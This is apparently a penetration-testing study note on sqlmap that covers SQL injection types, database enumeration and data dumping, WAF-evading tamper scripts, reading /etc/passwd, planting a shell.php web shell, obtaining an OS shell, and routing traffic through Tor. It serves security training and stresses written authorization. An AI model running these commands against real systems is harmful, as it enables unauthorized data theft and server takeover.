---
tags: [tools, vapt, utility]
difficulty: intermediate
module: "41 - Tools"
topic: "41.09 sqlmap"
---

# 41.09 sqlmap: Automated SQL Injection and Database Takeover

## Introduction

`sqlmap` is arguably the most powerful, comprehensive, and widely used open-source penetration testing tool for automating the detection and exploitation of SQL injection (SQLi) flaws and taking over database servers.

When manual SQL injection testing becomes tedious or when complex, blind, or time-based injections are required, `sqlmap` is the tool of choice. It comes with a massive payload engine, evasion capabilities, and post-exploitation features that allow an attacker to pivot from a simple web vulnerability into full system compromise.

### Why sqlmap?
- **Comprehensive Detection**: Supports Boolean-based blind, time-based blind, error-based, UNION query-based, stacked queries, and out-of-band SQLi.
- **Database Support**: MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase, SAP MaxDB, HSQLDB, and Informix.
- **Post-Exploitation**: Beyond just dumping data, it supports uploading/downloading files, executing OS commands via `xp_cmdshell` or user-defined functions (UDFs), and accessing out-of-band state.

## Architecture and Execution Flow

```text
+-------------------+      1. Inject Payload       +-----------------------+
|                   | <--------------------------  |                       |
| Web Application   |                              |      sqlmap Engine    |
| (Vulnerable Param)|  2. Analyze Response         | (Heuristics & Payloads|
|                   | -------------------------->  |                       |
+--------+----------+                              +-----------+-----------+
         |                                                     |
         | SQL Query                                           |
         v                                                     v
+-------------------+                              +-----------------------+
|                   |                              |  Data Extraction /    |
| Database Backend  |                              |  OS Shell / Dumping   |
| (MySQL, MSSQL...) |                              |                       |
+-------------------+                              +-----------------------+
```

The tool operates by first fingerprinting the backend database and the operating system. It then systematically tests parameters (GET, POST, Headers, Cookies) to identify the specific type of SQL injection present. Once confirmed, it crafts highly specific queries to enumerate databases, tables, columns, and ultimately extract the data.

## Core Concepts

1. **Injection Types**:
   - **Boolean-based blind**: Inferring data by evaluating True/False responses.
   - **Time-based blind**: Inferring data by injecting `SLEEP()` or `WAITFOR DELAY` commands and measuring response times.
   - **Error-based**: Forcing the database to return an error containing the desired data.
   - **UNION-based**: Appending a `UNION` statement to the original query to reflect data in the application's response.
   - **Stacked Queries**: Executing multiple queries in a single transaction (requires support from the database/driver).

2. **Risk and Level**:
   - **Level (1-5)**: Determines the depth of testing. Level 1 tests basic GET/POST parameters. Level 2 adds Cookies. Level 3 adds HTTP User-Agent/Referer headers. Levels 4 & 5 increase payload counts.
   - **Risk (1-3)**: Determines the potential for causing damage. Risk 1 is safe. Risk 2 adds heavy query time-based payloads. Risk 3 adds `OR` based payloads which might inadvertently update/delete data if injected into an `UPDATE` or `DELETE` statement.

## Installation and Setup

`sqlmap` is written in Python and is included by default in most penetration testing distributions like Kali Linux and Parrot OS.

To run it from the source:
```bash
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py -h
```

## Detailed Usage and Methodology

### Basic Injection Testing
To test a simple GET parameter:
```bash
sqlmap -u "http://example.com/product.php?id=1"
```
`sqlmap` will automatically test the `id` parameter. If it finds an injection, it will prompt you to stop testing other parameters and ask if you want to keep testing other payloads.

### Handling POST Requests and Complex Requests
For complex requests (e.g., POST data, JSON, specific headers, authentication cookies), the most reliable method is to save the request from Burp Suite into a text file and feed it to `sqlmap`.

1. Intercept request in Burp Suite.
2. Right-click -> "Copy to file" (save as `req.txt`).
3. Run `sqlmap`:
```bash
sqlmap -r req.txt -p username
```
The `-p` flag specifies exactly which parameter to test, saving time.

### Enumeration Workflow
Once an injection is confirmed, a standard workflow is followed to extract data:

1. **Get Database Names**:
   ```bash
   sqlmap -u "http://example.com/product.php?id=1" --dbs
   ```
2. **Select a Database and Get Tables**:
   ```bash
   sqlmap -u "http://example.com/product.php?id=1" -D target_db --tables
   ```
3. **Select a Table and Get Columns**:
   ```bash
   sqlmap -u "http://example.com/product.php?id=1" -D target_db -T users --columns
   ```
4. **Dump the Data**:
   ```bash
   sqlmap -u "http://example.com/product.php?id=1" -D target_db -T users -C username,password --dump
   ```

### Bypassing WAFs and Filters
Modern applications are often protected by Web Application Firewalls. `sqlmap` includes "tamper" scripts to obfuscate payloads.

```bash
sqlmap -u "http://example.com/product.php?id=1" --tamper=space2comment,charencode
```
Common tamper scripts include:
- `space2comment`: Replaces spaces with `/**/`.
- `charencode`: URL encodes characters.
- `randomcase`: Randomizes the case of SQL keywords (e.g., `sEleCt`).
- `base64encode`: Base64 encodes payloads if the application decodes them before processing.

### Post-Exploitation and OS Access
If the database user has sufficient privileges (e.g., `sa` on MSSQL or `root` on MySQL) and the environment allows it, `sqlmap` can execute OS commands.

- **Check DBA Privileges**:
  ```bash
  sqlmap -u "http://example.com/product.php?id=1" --is-dba
  ```
- **Read/Write Files**:
  ```bash
  sqlmap -u "http://example.com/product.php?id=1" --file-read="/etc/passwd"
  sqlmap -u "http://example.com/product.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
  ```
- **OS Shell Execution**:
  ```bash
  sqlmap -u "http://example.com/product.php?id=1" --os-shell
  ```
  This attempts to upload a stager (e.g., via `INTO OUTFILE` or `xp_cmdshell`) to provide a semi-interactive command prompt on the underlying server.

## Advanced Configuration

### Time-Based Injection Tuning
Time-based injections can be slow and sensitive to network latency. You can tune `sqlmap` to be more resilient:
- `--time-sec=10`: Increases the sleep time to 10 seconds to account for slow networks.
- `--threads=10`: Increases concurrent requests (be careful, as this might DoS the database).

### Proxies and Anonymity
To route traffic through Tor or an HTTP proxy (like Burp Suite for logging):
```bash
sqlmap -u "http://example.com/product.php?id=1" --proxy="http://127.0.0.1:8080"
```
```bash
sqlmap -u "http://example.com/product.php?id=1" --tor --tor-type=SOCKS5
```

## Security and Ethical Considerations
- `sqlmap` is highly aggressive. Running it with high thread counts or Risk level 3 against production databases can lead to severe data corruption or system outages.
- Never test targets without explicit, written authorization.
- Always use the `--batch` flag with caution, as it automatically answers 'Yes' to all prompts, which might include dangerous actions.

## Chaining Opportunities
- Use [[08 - Feroxbuster]] to find hidden parameters or endpoints that can then be fed into `sqlmap`.
- Use [[01 - Burp Suite]] to capture authenticated sessions and complex request structures to save as a file for `sqlmap` routing.
- If an `--os-shell` is obtained, leverage it to execute a reverse shell payload generated by [[12 - Metasploit Framework]].

## Related Notes
- [[08 - Feroxbuster]]
- [[10 - Nikto]]
- [[11 - Nuclei]]
- [[12 - Metasploit Framework]]
